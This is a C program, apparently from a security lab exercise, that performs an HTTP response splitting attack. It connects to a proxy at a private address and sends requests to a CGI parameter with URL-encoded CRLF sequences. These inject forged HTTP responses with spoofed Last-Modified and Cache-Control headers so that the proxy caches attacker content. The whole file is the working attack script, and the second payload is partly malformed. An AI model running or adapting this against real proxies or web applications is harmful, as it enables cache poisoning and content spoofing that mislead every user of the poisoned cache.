#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PROXY_IP "192.168.1.202" // Proxy server IP
#define PROXY_PORT 8080          // Proxy server port
#define RESPONSE_BUFFER_SIZE 8192

void send_http_response_splitting_attack() {
    int sockfd;
    struct sockaddr_in proxy_addr;
    char attack_request[1024];
    char proxy_response[1024];

    snprintf(attack_request, sizeof(attack_request),
         "GET /cgi-bin/course_selector HTTP/1.1\r\n"
         "Host:192.168.1.202\r\n"
         "Content-Type:application/x-www-form-urlencoded\r\n"
         "Content-Length:%lu\r\n\r\n"
         "course_id=67607%%0d%%0aConnection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
         "HTTP/1.0%%20200%%20OK%%0d%%0aContent-Type:%%20text/html%%0d%%0a"
         "Content-Length:%%2020%%0d%%0a%%0d%%0a<html>212973481</html>",
         strlen("course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0a%0d%0a"
                "HTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a"
                "Content-Length:%2020%0d%0a%0d%0a<html>212973481</html>"));

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the proxy address
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(PROXY_PORT);
    if (inet_pton(AF_INET, PROXY_IP, &proxy_addr.sin_addr) <= 0) {
        perror("Invalid proxy IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Connect to the proxy server
    if (connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        perror("Connection to proxy server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Send the crafted HTTP request
    if (send(sockfd, attack_request, strlen(attack_request), 0) < 0) {
        perror("Failed to send attack_request");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Malicious attack_request sent to the proxy.\n");

    // Receive the response from the proxy server
    ssize_t bytes_received = recv(sockfd, proxy_response, sizeof(proxy_response) - 1, 0);
    if (bytes_received < 0) {
        perror("Failed to receive response from proxy");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Get the current GMT time
    time_t now = time(NULL);
    struct tm *gmt = gmtime(&now);
    char last_modified[128];
    strftime(last_modified, sizeof(last_modified), "Last-Modified: %a, %d %b %Y %H:%M:%S GMT", gmt);

    char injected2_response[RESPONSE_BUFFER_SIZE];

    snprintf(injected2_response, sizeof(injected2_response),
            // First response
            "GET /cgi-bin/course_selector?course_id=67607%%0d%%0a"
            "Content-Type:%%20text/html%%0d%%0a"
            "Content-Length:%%2018%%0d%%0a%%0d%%0a"
            "<html>Hello</html>"
            
            // Second response
            "HTTP/1.1%%20200%%20OK%%0d%%0a"
            "%s%%0d%%0a"  // Inject dynamically generated Last-Modified field
            "Content-Type:%%20text/html%%0d%%0a"
            "Content-Length:%%2039%%0d%%0a"
            "Cache-Control:%%20public,%%20max-age=3600%%0d%%0a"
            "<!DOCTYPE%%20html>%%20<html>212973481</html>"
            "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
            "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n",
            last_modified
    );

    if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
        perror("Failed to send combined_response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Combined normal and injected responses sent to the proxy.\n");

    // Close the socket
    close(sockfd);
}

int main() {
    send_http_response_splitting_attack();
    return 0;
}
